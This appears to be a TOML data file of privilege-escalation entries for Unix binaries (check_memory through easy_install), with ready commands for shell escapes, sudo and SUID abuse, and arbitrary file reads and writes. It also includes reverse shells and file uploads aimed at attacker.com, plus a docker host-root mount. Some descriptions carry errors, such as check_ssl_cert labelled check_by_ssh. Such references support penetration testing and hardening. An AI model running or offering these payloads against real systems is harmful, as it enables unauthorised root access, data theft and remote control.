[[privilege-esclation]]
  Name = "check_memory"
  Description = "This is the `check_memory` Nagios plugin, available e.g. in `/usr/lib/nagios/plugins/`. The read file content is limited to the first line.\n"
  Tags = ["sudo", "file-read"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\ncheck_memory --extra-opts=@$LFILE\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_read\nsudo check_memory --extra-opts=@$LFILE\n"
[[privilege-esclation]]
  Name = "check_raid"
  Description = "This is the `check_raid` Nagios plugin, available e.g. in `/usr/lib/nagios/plugins/`. The read file content is limited to the first line.\n"
  Tags = ["file-read", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\ncheck_raid --extra-opts=@$LFILE\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_read\nsudo check_raid --extra-opts=@$LFILE\n"
[[privilege-esclation]]
  Name = "check_ssl_cert"
  Description = "This is the `check_by_ssh` Nagios plugin, available e.g. in `/usr/lib/nagios/plugins/`.\n"
  Tags = ["command", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.command]]
      exp = "COMMAND=id\nOUTPUT=output_file\nTF=$(mktemp)\necho \"$COMMAND | tee $OUTPUT\" > $TF\nchmod +x $TF\ncheck_ssl_cert --curl-bin $TF -H example.net\ncat $OUTPUT\n"
    [[privilege-esclation.exps.sudo]]
      exp = "COMMAND=id\nOUTPUT=output_file\nTF=$(mktemp)\necho \"$COMMAND | tee $OUTPUT\" > $TF\nchmod +x $TF\numask 022\ncheck_ssl_cert --curl-bin $TF -H example.net\ncat $OUTPUT\n"
[[privilege-esclation]]
  Name = "check_statusfile"
  Description = "This is the `check_statusfile` Nagios plugi plugin, available e.g. in `/usr/lib/nagios/plugins/`. The read file content is limited to the first line.\n"
  Tags = ["file-read", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\ncheck_statusfile $LFILE\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_read\nsudo check_statusfile $LFILE\n"
[[privilege-esclation]]
  Name = "chmod"
  Description = "This can be run with elevated privileges to change permissions (`6` denotes the SUID bits) and then read, write, or execute a file."
  Tags = ["suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_change\nsudo chmod 6777 $LFILE\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_change\n./chmod 6777 $LFILE\n"
[[privilege-esclation]]
  Name = "choom"
  Description = ""
  Tags = ["shell", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.shell]]
      exp = "choom -n 0 /bin/sh"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo choom -n 0 /bin/sh"
    [[privilege-esclation.exps.suid]]
      exp = "./choom -n 0 -- /bin/sh -p"
[[privilege-esclation]]
  Name = "chown"
  Description = "This can be run with elevated privileges to change ownership and then read, write, or execute a file."
  Tags = ["suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_change\nsudo chown $(id -un):$(id -gn) $LFILE\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_change\n./chown $(id -un):$(id -gn) $LFILE\n"
[[privilege-esclation]]
  Name = "chroot"
  Description = ""
  Tags = ["suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.sudo]]
      exp = "sudo chroot /\n"
    [[privilege-esclation.exps.suid]]
      exp = "./chroot / /bin/sh -p\n"
[[privilege-esclation]]
  Name = "cmp"
  Description = "Dump the bytes of the input file that are different from the NUL byte in a tabular format, hence this may not be suitable to read arbitrary binary files."
  Tags = ["file-read", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\ncmp $LFILE /dev/zero -b -l\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_read\nsudo cmp $LFILE /dev/zero -b -l\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_read\n./cmp $LFILE /dev/zero -b -l\n"
[[privilege-esclation]]
  Name = "cobc"
  Description = ""
  Tags = ["shell", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.shell]]
      exp = "TF=$(mktemp -d)\necho 'CALL \"SYSTEM\" USING \"/bin/sh\".' > $TF/x\ncobc -xFj --frelax-syntax-checks $TF/x\n"
    [[privilege-esclation.exps.sudo]]
      exp = "TF=$(mktemp -d)\necho 'CALL \"SYSTEM\" USING \"/bin/sh\".' > $TF/x\nsudo cobc -xFj --frelax-syntax-checks $TF/x\n"
[[privilege-esclation]]
  Name = "column"
  Description = "`column` expects textual data.\n"
  Tags = ["file-read", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\ncolumn $LFILE\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_read\nsudo column $LFILE\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_read\n./column $LFILE\n"
[[privilege-esclation]]
  Name = "comm"
  Description = ""
  Tags = ["file-read", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\ncomm $LFILE /dev/null 2>/dev/null\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_read\nsudo comm $LFILE /dev/null 2>/dev/null\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_read\ncomm $LFILE /dev/null 2>/dev/null\n"
[[privilege-esclation]]
  Name = "composer"
  Description = ""
  Tags = ["limited-suid", "sudo", "shell"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.limited-suid]]
      exp = "TF=$(mktemp -d)\necho '{\"scripts\":{\"x\":\"/bin/sh -i 0<&3 1>&3 2>&3\"}}' >$TF/composer.json\n./composer --working-dir=$TF run-script x\n"
    [[privilege-esclation.exps.shell]]
      exp = "TF=$(mktemp -d)\necho '{\"scripts\":{\"x\":\"/bin/sh -i 0<&3 1>&3 2>&3\"}}' >$TF/composer.json\ncomposer --working-dir=$TF run-script x\n"
    [[privilege-esclation.exps.sudo]]
      exp = "TF=$(mktemp -d)\necho '{\"scripts\":{\"x\":\"/bin/sh -i 0<&3 1>&3 2>&3\"}}' >$TF/composer.json\nsudo composer --working-dir=$TF run-script x\n"
[[privilege-esclation]]
  Name = "cowsay"
  Description = "It allows to execute [`perl`](/gtfobins/perl) code, other functions may apply."
  Tags = ["shell", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.shell]]
      exp = "TF=$(mktemp)\necho 'exec \"/bin/sh\";' >$TF\ncowsay -f $TF x\n"
    [[privilege-esclation.exps.sudo]]
      exp = "TF=$(mktemp)\necho 'exec \"/bin/sh\";' >$TF\nsudo cowsay -f $TF x\n"
[[privilege-esclation]]
  Name = "cowthink"
  Description = "It allows to execute [`perl`](/gtfobins/perl) code, other functions may apply."
  Tags = ["shell", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.shell]]
      exp = "TF=$(mktemp)\necho 'exec \"/bin/sh\";' >$TF\ncowthink -f $TF x\n"
    [[privilege-esclation.exps.sudo]]
      exp = "TF=$(mktemp)\necho 'exec \"/bin/sh\";' >$TF\nsudo cowthink -f $TF x\n"
[[privilege-esclation]]
  Name = "cp"
  Description = ""
  Tags = ["file-read", "file-write", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\ncp \"$LFILE\" /dev/stdout\n"
    [[privilege-esclation.exps.file-write]]
      exp = "LFILE=file_to_write\necho \"DATA\" | cp /dev/stdin \"$LFILE\"\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_write\necho \"DATA\" | sudo cp /dev/stdin \"$LFILE\"\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_write\nTF=$(mktemp)\necho \"DATA\" > $TF\nsudo cp $TF $LFILE\n"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo cp /bin/sh /bin/cp\nsudo cp\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_write\necho \"DATA\" | ./cp /dev/stdin \"$LFILE\"\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_write\nTF=$(mktemp)\necho \"DATA\" > $TF\n./cp $TF $LFILE\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_change\n./cp --attributes-only --preserve=all ./cp \"$LFILE\"\n"
[[privilege-esclation]]
  Name = "cpan"
  Description = ""
  Tags = ["shell", "reverse-shell", "file-upload", "file-download", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-download]]
      exp = "export URL=http://attacker.com/file_to_get\ncpan\n! use File::Fetch; my $file = (File::Fetch->new(uri => \"$ENV{URL}\"))->fetch();\n"
    [[privilege-esclation.exps.file-upload]]
      exp = "cpan\n! use HTTP::Server::Simple; my $server= HTTP::Server::Simple->new(); $server->run();\n"
    [[privilege-esclation.exps.reverse-shell]]
      exp = "export RHOST=localhost\nexport RPORT=9000\ncpan\n! use Socket; my $i=\"$ENV{RHOST}\"; my $p=$ENV{RPORT}; socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\")); if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\"); open(STDOUT,\">&S\"); open(STDERR,\">&S\"); exec(\"/bin/sh -i\");};\n"
    [[privilege-esclation.exps.shell]]
      exp = "cpan\n! exec '/bin/bash'\n"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo cpan\n! exec '/bin/bash'\n"
[[privilege-esclation]]
  Name = "cpio"
  Description = ""
  Tags = ["file-write", "suid", "sudo", "shell", "file-read"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\necho \"$LFILE\" | cpio -o\n"
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\nTF=$(mktemp -d)\necho \"$LFILE\" | cpio -dp $TF\ncat \"$TF/$LFILE\"\n"
    [[privilege-esclation.exps.file-write]]
      exp = "LFILE=file_to_write\nLDIR=where_to_write\necho DATA >$LFILE\necho $LFILE | cpio -up $LDIR\n"
    [[privilege-esclation.exps.shell]]
      exp = "echo '/bin/sh </dev/tty >/dev/tty' >localhost\ncpio -o --rsh-command /bin/sh -F localhost:\n"
    [[privilege-esclation.exps.sudo]]
      exp = "echo '/bin/sh </dev/tty >/dev/tty' >localhost\nsudo cpio -o --rsh-command /bin/sh -F localhost:\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_read\nTF=$(mktemp -d)\necho \"$LFILE\" | sudo cpio -R $UID -dp $TF\ncat \"$TF/$LFILE\"\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_write\nLDIR=where_to_write\necho DATA >$LFILE\necho $LFILE | sudo cpio -R 0:0 -p $LDIR\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_read\nTF=$(mktemp -d)\necho \"$LFILE\" | ./cpio -R $UID -dp $TF\ncat \"$TF/$LFILE\"\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_write\nLDIR=where_to_write\necho DATA >$LFILE\necho $LFILE | ./cpio -R 0:0 -p $LDIR\n"
[[privilege-esclation]]
  Name = "cpulimit"
  Description = ""
  Tags = ["shell", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.shell]]
      exp = "cpulimit -l 100 -f /bin/sh"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo cpulimit -l 100 -f /bin/sh"
    [[privilege-esclation.exps.suid]]
      exp = "./cpulimit -l 100 -f -- /bin/sh -p"
[[privilege-esclation]]
  Name = "crash"
  Description = ""
  Tags = ["shell", "command", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.command]]
      exp = "COMMAND='/usr/bin/id'\nCRASHPAGER=\"$COMMAND\" crash -h\n"
    [[privilege-esclation.exps.shell]]
      exp = "crash -h\n!sh\n"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo crash -h\n!sh\n"
[[privilege-esclation]]
  Name = "crontab"
  Description = ""
  Tags = ["command", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.command]]
      exp = "crontab -e"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo crontab -e"
[[privilege-esclation]]
  Name = "csh"
  Description = ""
  Tags = ["shell", "file-write", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-write]]
      exp = "export LFILE=file_to_write\nash -c 'echo DATA > $LFILE'\n"
    [[privilege-esclation.exps.shell]]
      exp = "csh"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo csh"
    [[privilege-esclation.exps.suid]]
      exp = "./csh -b"
[[privilege-esclation]]
  Name = "csplit"
  Description = ""
  Tags = ["file-read", "file-write", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\ncsplit $LFILE 1\ncat xx01\n"
    [[privilege-esclation.exps.file-write]]
      exp = "TF=$(mktemp)\necho \"DATA\" > $TF\nLFILE=file_to_write\ncsplit -z -b \"%d$LFILE\" $TF 1\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_read\ncsplit $LFILE 1\ncat xx01\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_read\ncsplit $LFILE 1\ncat xx01\n"
[[privilege-esclation]]
  Name = "csvtool"
  Description = ""
  Tags = ["sudo", "file-read", "file-write", "suid", "shell"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\ncsvtool trim t $LFILE\n"
    [[privilege-esclation.exps.file-write]]
      exp = "LFILE=file_to_write\nTF=$(mktemp)\necho DATA > $TF\ncsvtool trim t $TF -o $LFILE\n"
    [[privilege-esclation.exps.shell]]
      exp = "csvtool call '/bin/sh;false' /etc/passwd"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo csvtool call '/bin/sh;false' /etc/passwd"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_read\n./csvtool trim t $LFILE\n"
[[privilege-esclation]]
  Name = "cupsfilter"
  Description = ""
  Tags = ["file-read", "sudo", "suid"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\ncupsfilter -i application/octet-stream -m application/octet-stream $LFILE\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_read\nsudo cupsfilter -i application/octet-stream -m application/octet-stream $LFILE\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_read\n./cupsfilter -i application/octet-stream -m application/octet-stream $LFILE\n"
[[privilege-esclation]]
  Name = "curl"
  Description = ""
  Tags = ["file-download", "file-read", "file-write", "suid", "sudo", "file-upload"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-download]]
      exp = "URL=http://attacker.com/file_to_get\nLFILE=file_to_save\ncurl $URL -o $LFILE\n"
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=/tmp/file_to_read\ncurl file://$LFILE\n"
    [[privilege-esclation.exps.file-upload]]
      exp = "URL=http://attacker.com/\nLFILE=file_to_send\ncurl -X POST -d \"@$LFILE\" $URL\n"
    [[privilege-esclation.exps.file-write]]
      exp = "LFILE=file_to_write\nTF=$(mktemp)\necho DATA >$TF\ncurl \"file://$TF\" -o \"$LFILE\"\n"
    [[privilege-esclation.exps.sudo]]
      exp = "URL=http://attacker.com/file_to_get\nLFILE=file_to_save\nsudo curl $URL -o $LFILE\n"
    [[privilege-esclation.exps.suid]]
      exp = "URL=http://attacker.com/file_to_get\nLFILE=file_to_save\n./curl $URL -o $LFILE\n"
[[privilege-esclation]]
  Name = "cut"
  Description = ""
  Tags = ["file-read", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\ncut -d \"\" -f1 \"$LFILE\"\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_read\nsudo cut -d \"\" -f1 \"$LFILE\"\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_read\n./cut -d \"\" -f1 \"$LFILE\"\n"
[[privilege-esclation]]
  Name = "dash"
  Description = ""
  Tags = ["shell", "file-write", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-write]]
      exp = "export LFILE=file_to_write\ndash -c 'echo DATA > $LFILE'\n"
    [[privilege-esclation.exps.shell]]
      exp = "dash"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo dash"
    [[privilege-esclation.exps.suid]]
      exp = "./dash -p"
[[privilege-esclation]]
  Name = "date"
  Description = "Each line is corrupted by a prefix string and wrapped inside quotes, so this may not be suitable for binary files.\n\nThis only works for the GNU variant of `date`.\n"
  Tags = ["file-read", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\ndate -f $LFILE\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_read\nsudo date -f $LFILE\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_read\n./date -f $LFILE\n"
[[privilege-esclation]]
  Name = "dd"
  Description = ""
  Tags = ["suid", "sudo", "file-write", "file-read"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\ndd if=$LFILE\n"
    [[privilege-esclation.exps.file-write]]
      exp = "LFILE=file_to_write\necho \"DATA\" | dd of=$LFILE\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_write\necho \"data\" | sudo dd of=$LFILE\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_write\necho \"data\" | ./dd of=$LFILE\n"
[[privilege-esclation]]
  Name = "debugfs"
  Description = ""
  Tags = ["shell", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.shell]]
      exp = "debugfs\n!/bin/sh\n"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo debugfs\n!/bin/sh\n"
    [[privilege-esclation.exps.suid]]
      exp = "./debugfs\n!/bin/sh\n"
[[privilege-esclation]]
  Name = "dialog"
  Description = "The file is shown in an interactive TUI dialog, thus it is not suitable for binary/too big data."
  Tags = ["file-read", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\ndialog --textbox \"$LFILE\" 0 0\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_read\nsudo dialog --textbox \"$LFILE\" 0 0\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_read\n./dialog --textbox \"$LFILE\" 0 0\n"
[[privilege-esclation]]
  Name = "diff"
  Description = ""
  Tags = ["file-read", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\ndiff --line-format=%L /dev/null $LFILE\n"
    [[privilege-esclation.exps.file-read]]
      exp = "LFOLDER=folder_to_list\nTF=$(mktemp -d)\ndiff --recursive $TF $LFOLDER\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_read\nsudo diff --line-format=%L /dev/null $LFILE\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_read\n./diff --line-format=%L /dev/null $LFILE\n"
[[privilege-esclation]]
  Name = "dig"
  Description = "Each input line is treated as a lookup query for the `dig` command and the output is corrupted with the result or errors of the operation, so this may not be suitable for binary files. Grepping for `DiG` might help to filter out unwanted content."
  Tags = ["file-read", "sudo", "suid"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\ndig -f $LFILE\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_read\nsudo dig -f $LFILE\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_read\n./dig -f $LFILE\n"
[[privilege-esclation]]
  Name = "distcc"
  Description = ""
  Tags = ["suid", "sudo", "shell"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.shell]]
      exp = "distcc /bin/sh"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo distcc /bin/sh"
    [[privilege-esclation.exps.suid]]
      exp = "./distcc /bin/sh -p"
[[privilege-esclation]]
  Name = "dmesg"
  Description = ""
  Tags = ["sudo", "file-read", "shell"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\ndmesg -rF \"$LFILE\"\n"
    [[privilege-esclation.exps.shell]]
      exp = "dmesg -H\n!/bin/sh\n"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo dmesg -H\n!/bin/sh\n"
[[privilege-esclation]]
  Name = "dmidecode"
  Description = ""
  Tags = ["sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_write\nsudo dmidecode --no-sysfs -d x.dmi --dump-bin \"$LFILE\"\n"
[[privilege-esclation]]
  Name = "dmsetup"
  Description = ""
  Tags = ["sudo", "suid"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.sudo]]
      exp = "sudo dmsetup create base <<EOF\n0 3534848 linear /dev/loop0 94208\nEOF\nsudo dmsetup ls --exec '/bin/sh -s'\n"
    [[privilege-esclation.exps.suid]]
      exp = "./dmsetup create base <<EOF\n0 3534848 linear /dev/loop0 94208\nEOF\n./dmsetup ls --exec '/bin/sh -p -s'\n"
[[privilege-esclation]]
  Name = "dnf"
  Description = ""
  Tags = ["sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.sudo]]
      exp = "sudo dnf install -y x-1.0-1.noarch.rpm\n"
[[privilege-esclation]]
  Name = "docker"
  Description = "This requires the user to be privileged enough to run docker, i.e. being in the `docker` group or being `root`.\n\nAny other Docker Linux image should work, e.g., `debian`.\n"
  Tags = ["shell", "file-write", "file-read", "sudo", "suid"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "CONTAINER_ID=\"$(docker run -d alpine)\"  # or existing\nTF=$(mktemp)\ndocker cp file_to_read $CONTAINER_ID:$TF\ndocker cp $CONTAINER_ID:$TF $TF\ncat $TF\n"
    [[privilege-esclation.exps.file-write]]
      exp = "CONTAINER_ID=\"$(docker run -d alpine)\" # or existing\nTF=$(mktemp)\necho \"DATA\" > $TF\ndocker cp $TF $CONTAINER_ID:$TF\ndocker cp $CONTAINER_ID:$TF file_to_write\n"
    [[privilege-esclation.exps.shell]]
      exp = "docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
    [[privilege-esclation.exps.suid]]
      exp = "./docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
[[privilege-esclation]]
  Name = "dos2unix"
  Description = ""
  Tags = ["file-write"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-write]]
      exp = "LFILE1=file_to_read\nLFILE2=file_to_write\ndos2unix -f -n \"$LFILE1\" \"$LFILE2\"\n"
[[privilege-esclation]]
  Name = "dosbox"
  Description = "Basically `dosbox` allows to mount the local file system, so that it can be altered using DOS commands. Note that the DOS filename convention ([8.3](https://en.wikipedia.org/wiki/8.3_filename)) is used."
  Tags = ["file-read", "file-write", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE='\\path\\to\\file_to_read'\ndosbox -c 'mount c /' -c \"type c:$LFILE\"\n"
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE='\\path\\to\\file_to_read'\ndosbox -c 'mount c /' -c \"copy c:$LFILE c:\\tmp\\output\" -c exit\ncat '/tmp/OUTPUT'\n"
    [[privilege-esclation.exps.file-write]]
      exp = "LFILE='\\path\\to\\file_to_write'\ndosbox -c 'mount c /' -c \"echo DATA >c:$LFILE\" -c exit\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE='\\path\\to\\file_to_write'\nsudo dosbox -c 'mount c /' -c \"echo DATA >c:$LFILE\" -c exit\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE='\\path\\to\\file_to_write'\n./dosbox -c 'mount c /' -c \"echo DATA >c:$LFILE\" -c exit\n"
[[privilege-esclation]]
  Name = "dotnet"
  Description = ""
  Tags = ["file-read", "sudo", "shell"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "export LFILE=file_to_read\ndotnet fsi\nSystem.IO.File.ReadAllText(System.Environment.GetEnvironmentVariable(\"LFILE\"));;\n"
    [[privilege-esclation.exps.shell]]
      exp = "dotnet fsi\nSystem.Diagnostics.Process.Start(\"/bin/sh\").WaitForExit();;\n"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo dotnet fsi\nSystem.Diagnostics.Process.Start(\"/bin/sh\").WaitForExit();;\n"
[[privilege-esclation]]
  Name = "dpkg"
  Description = ""
  Tags = ["shell", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.shell]]
      exp = "dpkg -l\n!/bin/sh\n"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo dpkg -l\n!/bin/sh\n"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo dpkg -i x_1.0_all.deb"
[[privilege-esclation]]
  Name = "dstat"
  Description = "`dstat` allows you to run arbitrary [`python`](/gtfobins/python/) scripts loaded as \"external plugins\" if they are located in one of the directories stated in the `dstat` man page under \"FILES\":\n\n1. `~/.dstat/`\n2. `(path of binary)/plugins/`\n3. `/usr/share/dstat/`\n4. `/usr/local/share/dstat/`\n\nPick the one that you can write into.\n"
  Tags = ["shell", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.shell]]
      exp = "mkdir -p ~/.dstat\necho 'import os; os.execv(\"/bin/sh\", [\"sh\"])' >~/.dstat/dstat_xxx.py\ndstat --xxx\n"
    [[privilege-esclation.exps.sudo]]
      exp = "echo 'import os; os.execv(\"/bin/sh\", [\"sh\"])' >/usr/local/share/dstat/dstat_xxx.py\nsudo dstat --xxx\n"
[[privilege-esclation]]
  Name = "dvips"
  Description = "The `texput.dvi` output file produced by `tex` can be created offline and uploaded to the target."
  Tags = ["shell", "sudo", "limited-suid"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.limited-suid]]
      exp = "tex '\\special{psfile=\"`/bin/sh 1>&0\"}\\end'\n./dvips -R0 texput.dvi\n"
    [[privilege-esclation.exps.shell]]
      exp = "tex '\\special{psfile=\"`/bin/sh 1>&0\"}\\end'\ndvips -R0 texput.dvi\n"
    [[privilege-esclation.exps.sudo]]
      exp = "tex '\\special{psfile=\"`/bin/sh 1>&0\"}\\end'\nsudo dvips -R0 texput.dvi\n"
[[privilege-esclation]]
  Name = "easy_install"
  Description = ""
  Tags = ["file-read", "library-load", "sudo", "shell", "reverse-shell", "file-upload", "file-download", "file-write"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-download]]
      exp = "export URL=http://attacker.com/file_to_get\nexport LFILE=/tmp/file_to_save\nTF=$(mktemp -d)\necho \"import os;\nos.execl('$(whereis python)', '$(whereis python)', '-c', \\\"\\\"\\\"import sys;\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve('$URL', '$LFILE')\\\"\\\"\\\")\" > $TF/setup.py\npip install $TF\n"
    [[privilege-esclation.exps.file-read]]
      exp = "TF=$(mktemp -d)\necho 'print(open(\"file_to_read\").read())' > $TF/setup.py\neasy_install $TF\n"
    [[privilege-esclation.exps.file-upload]]
      exp = "export URL=http://attacker.com/\nexport LFILE=file_to_send\nTF=$(mktemp -d)\necho 'import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r, urllib.parse as u\nelse: import urllib as u, urllib2 as r\nr.urlopen(e[\"URL\"], bytes(u.urlencode({\"d\":open(e[\"LFILE\"]).read()}).encode()))' > $TF/setup.py\neasy_install $TF\n"
    [[privilege-esclation.exps.file-upload]]
      exp = "export LPORT=8888\nTF=$(mktemp -d)\necho 'import sys; from os import environ as e\nif sys.version_info.major == 3: import http.server as s, socketserver as ss\nelse: import SimpleHTTPServer as s, SocketServer as ss\nss.TCPServer((\"\", int(e[\"LPORT\"])), s.SimpleHTTPRequestHandler).serve_forever()' > $TF/setup.py\neasy_install $TF\n"
    [[privilege-esclation.exps.file-write]]
      exp = "export LFILE=/tmp/file_to_save\nTF=$(mktemp -d)\necho \"import os;\nos.execl('$(whereis python)', 'python', '-c', 'open(\\\"$LFILE\\\",\\\"w+\\\").write(\\\"DATA\\\")')\" > $TF/setup.py\neasy_install $TF\n"
    [[privilege-esclation.exps.library-load]]
      exp = "TF=$(mktemp -d)\necho 'from ctypes import cdll; cdll.LoadLibrary(\"lib.so\")' > $TF/setup.py\neasy_install $TF\n"
    [[privilege-esclation.exps.reverse-shell]]
      exp = "export RHOST=attacker.com\nexport RPORT=12345\nTF=$(mktemp -d)\necho 'import sys,socket,os,pty;s=socket.socket()\ns.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/sh\")' > $TF/setup.py\neasy_install $TF\n"
    [[privilege-esclation.exps.shell]]
      exp = "TF=$(mktemp -d)\necho \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')\" > $TF/setup.py\neasy_install $TF\n"
    [[privilege-esclation.exps.sudo]]
